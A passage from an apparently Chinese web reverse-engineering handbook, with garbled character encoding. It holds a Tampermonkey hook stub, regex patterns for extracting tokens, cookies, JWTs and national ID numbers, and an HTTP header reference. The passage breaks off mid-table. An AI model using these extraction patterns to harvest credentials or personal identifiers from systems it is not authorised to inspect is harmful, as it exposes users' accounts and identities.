<h3>Tampermonkey</h3>
<p>è®¾ç½®å¿«æ·é”®æ‰§è¡Œç”¨æˆ·è„šæœ¬ï¼š</p>
<pre><code class="language-javascript">// ==UserScript==
// @name         My Hook Script
// @grant        GM_registerMenuCommand
// ==/UserScript==

GM_registerMenuCommand(&quot;Execute Hook&quot;, function () {
  // Your hook code
});
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-15">Chrome DevTools</a></li>
<li><a href="#section-16">Burp Suite</a></li>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-66">
                                                <h2>[R65] Regex Patterns</h2>
                                                <h1>R65: æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨</h1>
<h2>å¸¸ç”¨å…ƒå­—ç¬¦</h2>
<p>| å…ƒå­—ç¬¦ | è¯´æ˜                   | ç¤ºä¾‹                               |
| ------ | ---------------------- | ---------------------------------- | ---- | -------------------- |
| <code>.</code>    | ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤æ¢è¡Œï¼‰ | <code>a.c</code> åŒ¹é… <code>abc</code>, <code>a1c</code>            |
| <code>*</code>    | 0 æ¬¡æˆ–å¤šæ¬¡             | <code>ab*</code> åŒ¹é… <code>a</code>, <code>ab</code>, <code>abb</code>        |
| <code>+</code>    | 1 æ¬¡æˆ–å¤šæ¬¡             | <code>ab+</code> åŒ¹é… <code>ab</code>, <code>abb</code> (ä¸åŒ¹é…<code>a</code>) |
| <code>?</code>    | 0 æ¬¡æˆ– 1 æ¬¡            | <code>ab?</code> åŒ¹é… <code>a</code>, <code>ab</code>               |
| <code>^</code>    | è¡Œé¦–                   | <code>^hello</code> åŒ¹é…è¡Œé¦–çš„ hello          |
| <code>$</code>    | è¡Œå°¾                   | <code>world$</code> åŒ¹é…è¡Œå°¾çš„ world          |
| <code>\</code>    | è½¬ä¹‰å­—ç¬¦               | <code>\.</code> åŒ¹é…ç‚¹å·                      |
| <code>     |</code>                      | æˆ–                                 | <code>cat | dog</code> åŒ¹é… cat æˆ– dog |
| <code>[]</code>   | å­—ç¬¦é›†                 | <code>[abc]</code> åŒ¹é… a æˆ– b æˆ– c           |
| <code>[^]</code>  | å¦å®šå­—ç¬¦é›†             | <code>[^abc]</code> ä¸åŒ¹é… a,b,c              |
| <code>()</code>   | åˆ†ç»„                   | <code>(ab)+</code> åŒ¹é… ab, abab              |</p>
<h2>é¢„å®šä¹‰å­—ç¬¦ç±»</h2>
<table>
<thead>
<tr>
  <th>å­—ç¬¦ç±»</th>
  <th>ç­‰ä»·äº</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>\d</code></td>
  <td><code>[0-9]</code></td>
  <td>æ•°å­—</td>
</tr>
<tr>
  <td><code>\D</code></td>
  <td><code>[^0-9]</code></td>
  <td>éæ•°å­—</td>
</tr>
<tr>
  <td><code>\w</code></td>
  <td><code>[a-zA-Z0-9_]</code></td>
  <td>å•è¯å­—ç¬¦</td>
</tr>
<tr>
  <td><code>\W</code></td>
  <td><code>[^a-zA-Z0-9_]</code></td>
  <td>éå•è¯å­—ç¬¦</td>
</tr>
<tr>
  <td><code>\s</code></td>
  <td><code>[ \t\n\r\f\v]</code></td>
  <td>ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
  <td><code>\S</code></td>
  <td><code>[^ \t\n\r\f\v]</code></td>
  <td>éç©ºç™½å­—ç¬¦</td>
</tr>
</tbody>
</table>
<h2>Web é€†å‘å¸¸ç”¨æ¨¡å¼</h2>
<h3>URL åŒ¹é…</h3>
<pre><code class="language-regex"># å®Œæ•´ URL
https?://[\w\-\.]+(/[\w\-\./?%&amp;=]*)?

# æå–åŸŸå
https?://([^/]+)

# æå–è·¯å¾„
https?://[^/]+(/[^?]+)

# æå–æŸ¥è¯¢å‚æ•°
[?&amp;]([^=]+)=([^&amp;]+)

# æå–æ‰€æœ‰ URL (å®½æ¾)
https?://[^\s]+
</code></pre>
<p><strong>Python ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">import re

text = &quot;Visit https://example.com/api?key=value and http://test.com&quot;
urls = re.findall(r'https?://[^\s]+', text)
# ['https://example.com/api?key=value', 'http://test.com']
</code></pre>
<h3>åŠ å¯†ç‰¹å¾</h3>
<pre><code class="language-regex"># MD5 (32ä½åå…­è¿›åˆ¶)
[a-f0-9]{32}

# SHA1 (40ä½)
[a-f0-9]{40}

# SHA256 (64ä½)
[a-f0-9]{64}

# Base64
[A-Za-z0-9+/]{4,}={0,2}

# JWT Token
eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+

# UUID
[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}
</code></pre>
<p><strong>JavaScript ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">const md5Pattern = /[a-f0-9]{32}/g;
const md5Hashes = text.match(md5Pattern);
</code></pre>
<h3>API å“åº”æå–</h3>
<pre><code class="language-regex"># JSON å­—ç¬¦ä¸²å€¼
&quot;([^&quot;]+)&quot;\s*:\s*&quot;([^&quot;]+)&quot;

# æå– token
[&quot;']token[&quot;']\s*:\s*[&quot;']([^&quot;']+)[&quot;']

# æå–æ•°å­—ID
[&quot;']id[&quot;']\s*:\s*(\d+)

# æå–æ‰€æœ‰é”®å€¼å¯¹
[&quot;'](\w+)[&quot;']\s*:\s*[&quot;']?([^,&quot;']+)[&quot;']?
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">import re
import json

response = '{&quot;token&quot;:&quot;abc123&quot;,&quot;user_id&quot;:12345}'

# æå– token
token = re.search(r'&quot;token&quot;\s*:\s*&quot;([^&quot;]+)&quot;', response).group(1)
# 'abc123'
</code></pre>
<h3>Cookie æå–</h3>
<pre><code class="language-regex"># æå–æ‰€æœ‰ Cookie
([^=]+)=([^;]+)

# æå–ç‰¹å®š Cookie
session_id=([^;]+)

# æå– Cookie å±æ€§
;\s*(\w+)=([^;]+)
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">cookie_str = &quot;session_id=abc123; user=admin; expires=Wed, 21 Oct 2025&quot;
cookies = dict(re.findall(r'([^=]+)=([^;]+)', cookie_str))
# {'session_id': 'abc123', 'user': 'admin', 'expires': 'Wed, 21 Oct 2025'}
</code></pre>
<h3>JavaScript ä»£ç æ¨¡å¼</h3>
<pre><code class="language-regex"># å‡½æ•°å®šä¹‰
function\s+(\w+)\s*\([^)]*\)

# å˜é‡å£°æ˜
(var|let|const)\s+(\w+)\s*=\s*([^;]+)

# å­—ç¬¦ä¸²å­—é¢é‡
[&quot;']([^&quot;']+)[&quot;']

# æ•°å­—å­—é¢é‡
\b\d+\.?\d*\b

# æ³¨é‡Š
//.*$|/\*[\s\S]*?\*/
</code></pre>
<h3>æ‰‹æœºå·/é‚®ç®±</h3>
<pre><code class="language-regex"># ä¸­å›½æ‰‹æœºå·
1[3-9]\d{9}

# é‚®ç®±
[\w\.-]+@[\w\.-]+\.\w+

# IPv4
\b(?:\d{1,3}\.){3}\d{1,3}\b

# èº«ä»½è¯å·
[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]
</code></pre>
<h2>JavaScript ä¸­ä½¿ç”¨</h2>
<h3>åŸºç¡€ç”¨æ³•</h3>
<pre><code class="language-javascript">const pattern = /pattern/flags;

// å¸¸ç”¨æ–¹æ³•
pattern.test(str)           // è¿”å› true/false
str.match(pattern)          // è¿”å›åŒ¹é…æ•°ç»„
str.replace(pattern, replacement)
pattern.exec(str)           // è¿”å›è¯¦ç»†åŒ¹é…ä¿¡æ¯
</code></pre>
<h3>Flags (æ ‡å¿—)</h3>
<table>
<thead>
<tr>
  <th>Flag</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>g</code></td>
  <td>å…¨å±€åŒ¹é…</td>
</tr>
<tr>
  <td><code>i</code></td>
  <td>å¿½ç•¥å¤§å°å†™</td>
</tr>
<tr>
  <td><code>m</code></td>
  <td>å¤šè¡Œæ¨¡å¼</td>
</tr>
<tr>
  <td><code>s</code></td>
  <td>dotAll æ¨¡å¼ï¼ˆ.åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼‰</td>
</tr>
<tr>
  <td><code>u</code></td>
  <td>Unicode æ¨¡å¼</td>
</tr>
<tr>
  <td><code>y</code></td>
  <td>ç²˜æ€§åŒ¹é…</td>
</tr>
</tbody>
</table>
<h3>ç¤ºä¾‹</h3>
<pre><code class="language-javascript">// æå–æ‰€æœ‰é“¾æ¥
const html = '&lt;a href=&quot;/page1&quot;&gt;Link&lt;/a&gt;&lt;a href=&quot;/page2&quot;&gt;Link2&lt;/a&gt;';
const links = html.match(/href=&quot;([^&quot;]+)&quot;/g);
// ['href=&quot;/page1&quot;', 'href=&quot;/page2&quot;']

// åªæå– href å€¼
const hrefValues = [...html.matchAll(/href=&quot;([^&quot;]+)&quot;/g)].map((m) =&gt; m[1]);
// ['/page1', '/page2']
</code></pre>
<h2>Python ä¸­ä½¿ç”¨</h2>
<h3>re æ¨¡å—</h3>
<pre><code class="language-python">import re

# ç¼–è¯‘æ­£åˆ™ï¼ˆæé«˜æ€§èƒ½ï¼‰
pattern = re.compile(r'pattern')

# å¸¸ç”¨æ–¹æ³•
re.search(pattern, string)      # æŸ¥æ‰¾ç¬¬ä¸€ä¸ªåŒ¹é…
re.findall(pattern, string)     # æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…
re.finditer(pattern, string)    # è¿”å›è¿­ä»£å™¨
re.sub(pattern, repl, string)   # æ›¿æ¢
re.split(pattern, string)       # åˆ†å‰²
</code></pre>
<h3>Flags</h3>
<pre><code class="language-python">re.IGNORECASE  # æˆ– re.I  - å¿½ç•¥å¤§å°å†™
re.MULTILINE   # æˆ– re.M  - å¤šè¡Œæ¨¡å¼
re.DOTALL      # æˆ– re.S  - .åŒ¹é…æ‰€æœ‰å­—ç¬¦
re.VERBOSE     # æˆ– re.X  - è¯¦ç»†æ¨¡å¼ï¼ˆå¯ä»¥å†™æ³¨é‡Šï¼‰
</code></pre>
<h3>ç¤ºä¾‹</h3>
<pre><code class="language-python"># æå–åŠ å¯†å‚æ•°
code = 'sign=md5(&quot;user&quot;+password+&quot;secret&quot;)'
match = re.search(r'sign=(\w+)\(&quot;([^&quot;]+)&quot;\+(\w+)\+&quot;([^&quot;]+)&quot;\)', code)
if match:
    algorithm = match.group(1)  # 'md5'
    param1 = match.group(2)      # 'user'
    param2 = match.group(3)      # 'password'
    secret = match.group(4)      # 'secret'
</code></pre>
<h2>é«˜çº§æŠ€å·§</h2>
<h3>éè´ªå©ªåŒ¹é…</h3>
<pre><code class="language-regex"># è´ªå©ªï¼ˆå°½å¯èƒ½å¤šï¼‰
.*

# éè´ªå©ªï¼ˆå°½å¯èƒ½å°‘ï¼‰
.*?

# ç¤ºä¾‹
&lt;div&gt;content&lt;/div&gt;&lt;div&gt;more&lt;/div&gt;

# è´ªå©ª: &lt;div&gt;.*&lt;/div&gt;
# åŒ¹é…: &lt;div&gt;content&lt;/div&gt;&lt;div&gt;more&lt;/div&gt;

# éè´ªå©ª: &lt;div&gt;.*?&lt;/div&gt;
# åŒ¹é…: &lt;div&gt;content&lt;/div&gt;
</code></pre>
<h3>å‰ç»å’Œåé¡¾</h3>
<pre><code class="language-regex"># æ­£å‘å‰ç» (?=pattern)
\w+(?=\d)       # åŒ¹é…åé¢è·Ÿæ•°å­—çš„å•è¯

# è´Ÿå‘å‰ç» (?!pattern)
\w+(?!\d)       # åŒ¹é…åé¢ä¸è·Ÿæ•°å­—çš„å•è¯

# æ­£å‘åé¡¾ (?&lt;=pattern)
(?&lt;=\$)\d+      # åŒ¹é…å‰é¢æœ‰$ç¬¦å·çš„æ•°å­—

# è´Ÿå‘åé¡¾ (?&lt;!pattern)
(?&lt;!\$)\d+      # åŒ¹é…å‰é¢æ²¡æœ‰$ç¬¦å·çš„æ•°å­—
</code></pre>
<h3>å‘½ååˆ†ç»„</h3>
<pre><code class="language-python"># Python
pattern = r'(?P&lt;year&gt;\d{4})-(?P&lt;month&gt;\d{2})-(?P&lt;day&gt;\d{2})'
match = re.search(pattern, '2024-01-15')
print(match.group('year'))   # '2024'
print(match.group('month'))  # '01'
</code></pre>
<pre><code class="language-javascript">// JavaScript
const pattern = /(?&lt;year&gt;\d{4})-(?&lt;month&gt;\d{2})-(?&lt;day&gt;\d{2})/;
const match = &quot;2024-01-15&quot;.match(pattern);
console.log(match.groups.year); // '2024'
</code></pre>
<h2>åœ¨çº¿æµ‹è¯•å·¥å…·</h2>
<ul>
<li><strong>Regex101</strong>: <a href="https://regex101.com/">https://regex101.com/</a> (æ¨èï¼Œæœ‰è¯¦ç»†è¯´æ˜)</li>
<li><strong>RegExr</strong>: <a href="https://regexr.com/">https://regexr.com/</a></li>
<li><strong>RegexPal</strong>: <a href="https://www.regexpal.com/">https://www.regexpal.com/</a></li>
</ul>
<h2>å®æˆ˜ç¤ºä¾‹é›†</h2>
<h3>1. æå– JavaScript å‡½æ•°è°ƒç”¨</h3>
<pre><code class="language-regex">(\w+)\s*\(([^)]*)\)
</code></pre>
<pre><code class="language-python">code = &quot;encrypt('password', 'key'); hash(data)&quot;
calls = re.findall(r'(\w+)\s*\(([^)]*)\)', code)
# [('encrypt', &quot;'password', 'key'&quot;), ('hash', 'data')]
</code></pre>
<h3>2. æ¸…ç† HTML æ ‡ç­¾</h3>
<pre><code class="language-python">html = &quot;&lt;p&gt;Hello &lt;strong&gt;World&lt;/strong&gt;&lt;/p&gt;&quot;
text = re.sub(r'&lt;[^&gt;]+&gt;', '', html)
# &quot;Hello World&quot;
</code></pre>
<h3>3. éªŒè¯æ—¶é—´æˆ³æ ¼å¼</h3>
<pre><code class="language-regex"># 13ä½æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰
\b1\d{12}\b

# 10ä½æ—¶é—´æˆ³ï¼ˆç§’ï¼‰
\b1\d{9}\b
</code></pre>
<h3>4. æå–æ··æ·†å˜é‡å</h3>
<pre><code class="language-regex"># æå– _0x å¼€å¤´çš„å˜é‡
_0x[a-f0-9]+
</code></pre>
<pre><code class="language-python">code = &quot;var _0x1234 = function(_0xabcd) { return _0xabcd + _0x5678; }&quot;
vars = re.findall(r'_0x[a-f0-9]+', code)
# ['_0x1234', '_0xabcd', '_0xabcd', '_0x5678']
</code></pre>
<h2>æ€§èƒ½ä¼˜åŒ–</h2>
<h3>é¿å…å›æº¯</h3>
<pre><code class="language-regex"># æ…¢ï¼ˆå¤§é‡å›æº¯ï¼‰
(a+)*b

# å¿«ï¼ˆä½¿ç”¨åŸå­ç»„ï¼‰
(?&gt;a+)*b
</code></pre>
<h3>ç¼–è¯‘æ­£åˆ™</h3>
<pre><code class="language-python"># å¦‚æœè¦å¤šæ¬¡ä½¿ç”¨ï¼Œå…ˆç¼–è¯‘
pattern = re.compile(r'complex_pattern')
for text in texts:
    matches = pattern.findall(text)  # æ›´å¿«
</code></pre>
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-28">API é€†å‘</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-67">
                                                <h2>[R66] HTTP Headers</h2>
                                                <h1>R66: HTTP å¤´é€ŸæŸ¥è¡¨</h1>
<h2>å¸¸è§è¯·æ±‚å¤´ (Request Headers)</h2>
<table>
<thead>
<tr>
  <th>Header</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>User-Agent</strong></td>
  <td>å®¢æˆ·ç«¯ä¿¡æ¯</td>
  <td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)...</code></td>
</tr>
<tr>
  <td><strong>Accept</strong></td>
  <td>å¯æ¥å—çš„å†…å®¹ç±»å‹</td>
  <td><code>application/json, text/plain, */*</code></td>
</tr>
<tr>
  <td><strong>Accept-Language</strong></td>
  <td>å¯æ¥å—çš„è¯­è¨€</td>
  <td><code>zh-CN,zh;q=0.9,en;q=0.8</code></td>
</tr>
<tr>
  <td><strong>Accept-Encoding</strong></td>
  <td>å¯æ¥å—çš„ç¼–ç </td>
  <td><code>gzip, deflate, br</code></td>
</tr>
<tr>
  <td><strong>Content-Type</strong></td>
  <td>è¯·æ±‚ä½“å†…å®¹ç±»å‹</td>
  <td><code>application/json; charset=UTF-8</code></td>
</tr>
<tr>
  <td><strong>Content-Length</strong></td>
  <td>è¯·æ±‚ä½“é•¿åº¦</td>
  <td><code>1234</code></td>
</tr>
<tr>
  <td><strong>Authorization</strong></td>
  <td>è®¤è¯ä¿¡æ¯</td>
  <td><code>Bearer eyJhbGciOiJIUzI1NiIs...</code></td>
</tr>
<tr>
  <td><strong>Cookie</strong></td>
  <td>Cookie æ•°æ®</td>
  <td><code>session_id=abc123; user=admin</code></td>
</tr>
<tr>
  <td><strong>Referer</strong></td>
  <td>æ¥æºé¡µé¢</td>
  <td><code>https://example.com/page1</code></td>
</tr>
<tr>
  <td><strong>Origin</strong></td>
  <td>è¯·æ±‚æ¥æº</td>
  <td><code>https://example.com</code></td>
</tr>
<tr>
  <td><strong>Host</strong></td>
  <td>ç›®æ ‡ä¸»æœº</td>
  <td><code>api.example.com</code></td>
</tr>
<tr>
  <td><strong>Connection</strong></td>
  <td>è¿æ¥æ–¹å¼</td>
  <td><code>keep-alive</code></td>
</tr>
<tr>
  <td><strong>Cache-Control</strong></td>
  <td>ç¼“å­˜æ§åˆ¶</td>
  <td><code>no-cache, no-store</code></td>
</tr>
<tr>
  <td><strong>Pragma</strong></td>
  <td>HTTP/1.0 ç¼“å­˜æ§åˆ¶</td>
  <td><code>no-cache</code></td>
</tr>
<tr>
  <td><strong>If-Modified-Since</strong></td>
  <td>æ¡ä»¶è¯·æ±‚</td>
  <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
</tr>
<tr>
  <td><strong>If-None-Match</strong></td>
  <td>ETag æ¡ä»¶è¯·æ±‚</td>
  <td><code>&quot;686897696a7c876b7e&quot;</code></td>
</tr>
<tr>
  <td><strong>Range</strong></td>
  <td>èŒƒå›´è¯·æ±‚</td>
  <td><code>bytes=0-1024</code></td>
</tr>
<tr>
  <td><strong>X-Requested-With</strong></td>
  <td>æ ‡è¯† AJAX è¯·æ±‚</td>
  <td><code>XMLHttpRequest</code></td>
</tr>
<tr>
  <td><strong>X-CSRF-Token</strong></td>
  <td>CSRF ä»¤ç‰Œ</td>
  <td><code>abc123def456</code></td>
</tr>
</tbody>
</table>
<h2>å¸¸è§å“åº”å¤´ (Response Headers)</h2>
<table>
<thead>
<tr>
  <th>Header</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Content-Type</strong></td>
  <td>å“åº”å†…å®¹ç±»å‹</td>
  <td><code>application/json; charset=utf-8</code></td>
</tr>
<tr>
  <td><strong>Content-Length</strong></td>
  <td>å“åº”ä½“é•¿åº¦</td>
  <td><code>1234</code></td>
</tr>
<tr>
  <td><strong>Content-Encoding</strong></td>
  <td>å“åº”ç¼–ç </td>
  <td><code>gzip</code></td>
</tr>
<tr>
  <td><strong>Set-Cookie</strong></td>
  <td>è®¾ç½® Cookie</td>
  <td><code>session_id=abc123; Path=/; HttpOnly</code></td>
</tr>
<tr>
  <td><strong>Cache-Control</strong></td>
  <td>ç¼“å­˜ç­–ç•¥</td>
  <td><code>max-age=3600, must-revalidate</code></td>
</tr>
<tr>
  <td><strong>Expires</strong></td>
  <td>è¿‡æœŸæ—¶é—´</td>
  <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
</tr>
<tr>
  <td><strong>ETag</strong></td>
  <td>èµ„æºæ ‡è¯†</td>
  <td><code>&quot;686897696a7c876b7e&quot;</code></td>
</tr>
<tr>
  <td><strong>Last-Modified</strong></td>
  <td>æœ€åä¿®æ”¹æ—¶é—´</td>
  <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
</tr>
<tr>
  <td><strong>Location</strong></td>
  <td>é‡å®šå‘åœ°å€</td>
  <td><code>https://example.com/new-page</code></td>
</tr>
<tr>
  <td><strong>Server</strong></td>
  <td>æœåŠ¡å™¨ä¿¡æ¯</td>
  <td><code>nginx/1.18.0</code></td>
</tr>
<tr>
  <td><strong>X-Powered-By</strong></td>
  <td>æŠ€æœ¯æ ˆ</td>
  <td><code>PHP/7.4.0</code></td>
</tr>
<tr>
  <td><strong>Access-Control-Allow-Origin</strong></td>
  <td>CORS å…è®¸æ¥æº</td>
  <td><code>*</code> æˆ– <code>https://example.com</code></td>
</tr>
<tr>
  <td><strong>Access-Control-Allow-Methods</strong></td>
  <td>CORS å…è®¸æ–¹æ³•</td>
  <td><code>GET, POST, PUT, DELETE</code></td>
</tr>
<tr>
  <td><strong>Access-Control-Allow-Headers</strong></td>
  <td>CORS å…è®¸å¤´</td>
  <td><code>Content-Type, Authorization</code></td>
</tr>
<tr>
  <td><strong>Access-Control-Max-Age</strong></td>
  <td>CORS é¢„æ£€ç¼“å­˜</td>
  <td><code>3600</code></td>
</tr>
<tr>
  <td><strong>Strict-Transport-Security</strong></td>
  <td>HSTS</td>
  <td><code>max-age=31536000; includeSubDomains</code></td>
</tr>
<tr>
  <td><strong>X-Frame-Options</strong></td>
  <td>é˜²ç‚¹å‡»åŠ«æŒ</td>
  <td><code>DENY</code></td>
</tr>
<tr>
  <td><strong>X-Content-Type-Options</strong></td>
  <td>é˜² MIME å—…æ¢</td>
  <td><code>nosniff</code></td>
</tr>
<tr>
  <td><strong>X-XSS-Protection</strong></td>
  <td>XSS è¿‡æ»¤å™¨</td>
  <td><code>1; mode=block</code></td>
</tr>
</tbody>
</table>
<h2>å®‰å…¨ç›¸å…³å¤´</h2>
<h3>è¯·æ±‚å®‰å…¨å¤´</h3>
<pre><code class="language-http"># CSRF é˜²æŠ¤
X-CSRF-Token: abc123def456
X-XSRF-TOKEN: abc123def456

# è‡ªå®šä¹‰ç­¾å
X-Signature: md5_hash_value
X-Sign: sha256_hash_value
X-Timestamp: 1702887654321

# APIå¯†é’¥
X-API-Key: your_api_key_here
API-Key: your_api_key_here
</code></pre>
<h3>å“åº”å®‰å…¨å¤´</h3>
<pre><code class="language-http"># å†…å®¹å®‰å…¨ç­–ç•¥
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

# XSS é˜²æŠ¤
X-XSS-Protection: 1; mode=block

# é˜²ç‚¹å‡»åŠ«æŒ
X-Frame-Options: SAMEORIGIN

# MIME ç±»å‹å—…æ¢é˜²æŠ¤
X-Content-Type-Options: nosniff

# Referer ç­–ç•¥
Referrer-Policy: no-referrer-when-downgrade

# æƒé™ç­–ç•¥
Permissions-Policy: geolocation=(), camera=()
</code></pre>
<h2>Content-Type å¸¸è§å€¼</h2>
<h3>è¯·æ±‚/å“åº”é€šç”¨</h3>
<table>
<thead>
<tr>
  <th>Content-Type</th>
  <th>è¯´æ˜</th>
  <th>ç”¨é€”</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>application/json</code></td>
  <td>JSON æ•°æ®</td>
  <td>API è¯·æ±‚/å“åº”</td>
</tr>
<tr>
  <td><code>application/x-www-form-urlencoded</code></td>
  <td>è¡¨å•æ•°æ®</td>
  <td>ä¼ ç»Ÿè¡¨å•æäº¤</td>
</tr>
<tr>
  <td><code>multipart/form-data</code></td>
  <td>æ–‡ä»¶ä¸Šä¼ </td>
  <td>å«æ–‡ä»¶çš„è¡¨å•</td>
</tr>
<tr>
  <td><code>text/html</code></td>
  <td>HTML æ–‡æ¡£</td>
  <td>ç½‘é¡µ</td>
</tr>
<tr>
  <td><code>text/plain</code></td>
  <td>çº¯æ–‡æœ¬</td>
  <td>æ–‡æœ¬æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>text/css</code></td>
  <td>CSS æ ·å¼</td>
  <td>æ ·å¼è¡¨</td>
</tr>
<tr>
  <td><code>text/javascript</code></td>
  <td>JavaScript</td>
  <td>JS æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>application/javascript</code></td>
  <td>JavaScript</td>
  <td>JS æ–‡ä»¶ï¼ˆæ–°æ ‡å‡†ï¼‰</td>
</tr>
<tr>
  <td><code>application/xml</code></td>
  <td>XML æ•°æ®</td>
  <td>XML æ ¼å¼</td>
</tr>
<tr>
  <td><code>text/xml</code></td>
  <td>XML æ–‡æœ¬</td>
  <td>XML æ–‡æœ¬</td>
</tr>
<tr>
  <td><code>application/octet-stream</code></td>
  <td>äºŒè¿›åˆ¶æµ</td>
  <td>æ–‡ä»¶ä¸‹è½½</td>
</tr>
<tr>
  <td><code>image/jpeg</code></td>
  <td>JPEG å›¾ç‰‡</td>
  <td>å›¾ç‰‡</td>
</tr>
<tr>
  <td><code>image/png</code></td>
  <td>PNG å›¾ç‰‡</td>
  <td>å›¾ç‰‡</td>
</tr>
<tr>
  <td><code>image/gif</code></td>
  <td>GIF å›¾ç‰‡</td>
  <td>åŠ¨å›¾</td>
</tr>
<tr>
  <td><code>image/svg+xml</code></td>
  <td>SVG å›¾ç‰‡</td>
  <td>çŸ¢é‡å›¾</td>
</tr>
<tr>
  <td><code>video/mp4</code></td>
  <td>MP4 è§†é¢‘</td>
  <td>è§†é¢‘</td>
</tr>
<tr>
  <td><code>audio/mpeg</code></td>
  <td>MP3 éŸ³é¢‘</td>
  <td>éŸ³é¢‘</td>
</tr>
</tbody>
</table>
<h2>è‡ªå®šä¹‰å¤´ç¤ºä¾‹</h2>
<h3>å¸¸è§çš„è‡ªå®šä¹‰ä¸šåŠ¡å¤´</h3>
<pre><code class="language-http"># ç‰ˆæœ¬æ§åˆ¶
X-API-Version: 1.0
X-Client-Version: 2.3.1

# è®¾å¤‡ä¿¡æ¯
X-Device-ID: 1234567890abcdef
X-Device-Type: mobile
X-Platform: ios
X-OS-Version: 14.5

# è¿½è¸ªå’Œè°ƒè¯•
X-Request-ID: uuid-1234-5678
X-Trace-ID: trace_abc123
X-Debug: true

# åœ°ç†ä½ç½®
X-Geo-Country: CN
X-Geo-City: Beijing
X-Client-IP: 1.2.3.4

# A/Bæµ‹è¯•
X-Experiment: variant_b
X-Feature-Flag: new_ui_enabled
</code></pre>
<h2>User-Agent ç¤ºä¾‹</h2>
<h3>æ¡Œé¢æµè§ˆå™¨</h3>
<pre><code class="language-http"># Chrome (Windows)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

# Firefox (Windows)
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

# Edge (Windows)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0

# Safari (macOS)
Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
</code></pre>
<h3>ç§»åŠ¨æµè§ˆå™¨</h3>
<pre><code class="language-http"># iPhone Safari
Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1

# Android Chrome
Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36

# iPad Safari
Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
</code></pre>
<h3>çˆ¬è™«/å·¥å…·</h3>
<pre><code class="language-http"># Python Requests
python-requests/2.31.0

# Postman
PostmanRuntime/7.36.0

# cURL
curl/7.68.0
</code></pre>
<h2>Authorization æ–¹å¼</h2>
<h3>Bearer Token</h3>
<pre><code class="language-http">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
</code></pre>
<h3>Basic Auth</h3>
<pre><code class="language-http">Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
# (username:password çš„ Base64ç¼–ç )
</code></pre>
<h3>Digest Auth</h3>
<pre><code class="language-http">Authorization: Digest username=&quot;user&quot;, realm=&quot;example.com&quot;, nonce=&quot;abc123&quot;, uri=&quot;/api&quot;, response=&quot;def456&quot;
</code></pre>
<h3>API Key</h3>
<pre><code class="language-http">Authorization: ApiKey your_api_key_here
# æˆ–
X-API-Key: your_api_key_here
</code></pre>
<h2>Cookie å±æ€§</h2>
<pre><code class="language-http">Set-Cookie: session_id=abc123; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Max-Age=3600; Secure; HttpOnly; SameSite=Strict
</code></pre>
<p><strong>å±æ€§è¯´æ˜</strong>:</p>
<table>
<thead>
<tr>
  <th>å±æ€§</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Domain</code></td>
  <td>Cookie çš„ä½œç”¨åŸŸ</td>
</tr>
<tr>
  <td><code>Path</code></td>
  <td>Cookie çš„ä½œç”¨è·¯å¾„</td>
</tr>
<tr>
  <td><code>Expires</code></td>
